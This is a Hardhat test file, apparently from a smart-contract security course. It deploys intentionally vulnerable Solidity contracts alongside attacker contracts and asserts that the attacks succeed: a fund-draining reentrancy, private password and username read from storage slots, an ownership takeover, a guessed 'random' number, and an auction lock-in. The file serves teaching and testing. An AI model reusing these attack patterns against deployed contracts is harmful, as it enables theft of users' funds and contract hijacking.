const { expect } = require("chai")
const { BigNumber } = require("ethers")
const { parseEther } = require("ethers/lib/utils")
const { ethers } = require("hardhat")

describe("Attack", function() {
    it("Should empty the balance of the good contract", async function () {
        //Deploy the good contract
        const goodContractFactory = await ethers.getContractFactory("GoodContract")
        const goodContract = await goodContractFactory.deploy()
        await goodContract.deployed()

        //Deploy the bad contract
        const badContractFactory = await ethers.getContractFactory("BadContract")
        const badContract = await badContractFactory.deploy(goodContract.address)
        await badContract.deployed()

        //Get two signers, one innocent and one attacker
        const[_, innocentAddress, badAddress] = await ethers.getSigners()

        //Innocent user deposit 10eth into goodContract
        let tx = await goodContract.connect(innocentAddress).addBalance({
            value: parseEther("10"),
        })
        await tx.wait()

        //Check that at this point, the GoodContract's balance is 10 Eth
        let balanceETH = await ethers.provider.getBalance(goodContract.address)
        expect(balanceETH).to.equal(parseEther("10"))

        //Attacker calls the attack function and sends 1 eth
        tx = await badContract.connect(badAddress).attack({
            value: parseEther("1")
        })
        await tx.wait()

        //Balance of the GoodContract is now Zero
        balanceETH = await ethers.provider.getBalance(goodContract.address)
        expect(balanceETH).to.equal(BigNumber.from("0"))

        //Balance of the BadContract is now 11ETH (10 ETH stolen + 1 ETH from attacker)
        balanceETH = await ethers.provider.getBalance(badContract.address)
        expect(balanceETH).to.equal(parseEther("11"))

    })

    it("Should be able to read the private variables password and username", async function (){
        // Deploy tghe Login contract
        const loginFactory = await ethers.getContractFactory("Login")
        
        //to save space we will convert the string to bytes32 array
        const usernameBytes = ethers.utils.formatBytes32String("test")
        const passwordBytes = ethers.utils.formatBytes32String("password")

        const loginContract = await loginFactory.deploy(
            usernameBytes,
            passwordBytes
        )
        await loginContract.deployed();

        //Get the storage ar storage slot 0,1
        const slot0Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            0
        )
        const slot1Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            1
        )

        //We are able to extract the values of the private variables
        expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test")
        expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("password")
    })

    it("Should change the owner of the good contract", async function (){
        //Deploy the helper contract
        const helperContract = await ethers.getContractFactory("Helper")
        const _helperContract = await helperContract.deploy()
        await _helperContract.deployed();
        console.log("Helper Contract's address:", _helperContract.address)

        //deploy the good contract
        const goodContract = await ethers.getContractFactory("Good")
        const _goodContract = await goodContract.deploy(_helperContract.address)
        await _goodContract.deployed();
        console.log("Good Contract's address:", _goodContract.address)

        //deploy the attack contract
        const attackContract = await ethers.getContractFactory("Attack")
        const _attackContract = await attackContract.deploy(_goodContract.address)
        await _attackContract.deployed();
        console.log("Helper Contract's address:", _attackContract.address)

        //now lets attack the good contract
        //Begin
        let tx = await _attackContract.attack()
        await tx.wait()

        expect(await _goodContract.owner()).to.equal(_attackContract.address)
    })

    it("Should be able to guess the exact number in the Game", async function(){
        //deploy the game contract
        const Game = await ethers.getContractFactory("Game")
        const _game = await Game.deploy({value: parseEther("0.1")})
        await _game.deployed()

        //deploy the ttack contract
        const Attack = await ethers.getContractFactory("AttackGame")
        const _attack = await Attack.deploy(_game.address)

        console.log("Attack contract address:", _attack.address)

        //Attack the game contract
        const tx = await _attack.attack()
        await tx.wait()

        const balanceOfGame = await _game.getBalance()
        expect(balanceOfGame).to.equal(BigNumber.from("0"))
    })

    it("After being declared the winner, should not allow anyone else to become the winner", async function(){
        //deploy the goodAuction contract
        const goodAuction = await ethers.getContractFactory("GoodAuction")
        const _goodAuction = await goodAuction.deploy()
        await _goodAuction.deployed()

        console.log("GoodAuction contract address:", _goodAuction.address)

        //deploy the attackAuction contract
        const attackAuction = await ethers.getContractFactory("AttackAuction")
        const _attackAuction = await attackAuction.deploy(_goodAuction.address)
        await _attackAuction.deployed()

        console.log("AttackAuction contract address:", _attackAuction.address)

        //now let us attack the goodAuction contract
        //get two addresses
        const[_, addr1, addr2] = await ethers.getSigners()

        //initially let addr1 be the winner of the auction
        let tx = await _goodAuction.connect(addr1).setCurrentAuctionPrice({value: parseEther("1"),})
        await tx.wait();

        //start the attack and make the attackAution.sol the current winner of the goodAuction

        tx = await _attackAuction.attack({value: parseEther("3"),})
        await tx.wait()

        //now let us try making addr2 the current winner of the goodAuction
        tx = await _goodAuction.connect(addr2).setCurrentAuctionPrice({value: parseEther("4"),})
        await tx.wait()

        //now check that the currernt winner is still the attacker
        expect(await _goodAuction.currentWinner()).to.equal(_attackAuction.address)
    })
})